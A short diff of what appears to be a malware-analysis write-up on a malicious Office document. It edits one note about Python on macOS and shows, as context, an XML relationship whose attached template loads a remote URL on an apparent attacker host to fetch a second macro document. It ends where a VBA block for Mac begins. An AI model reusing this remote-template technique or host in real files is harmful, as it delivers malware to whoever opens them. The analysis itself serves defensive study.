@@ -20,7 +20,7 @@
 <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://crphone.mireene.com/plugin/editor/Templates/normal.php?name=web" TargetMode="External"/>
 </Relationships>
 ```
-<h6>This executes a second maldoc with a macro. The first block of the VBA code is the declaration for use the functions of the office version on Mac. <br/>Note : Mac OS X 10.8 comes with Python 2.7 pre-installed by Apple and now Python 3 on the lastest releases.</h6>
+<h6>This executes a second maldoc with a macro. The first block of the VBA code is the declaration for use the functions of the office version on Mac. <br/>Note : Mac OS X 10.8 comes with Python 2.7 pre-installed by Apple.</h6>
 
 ```python
 #If Mac Then
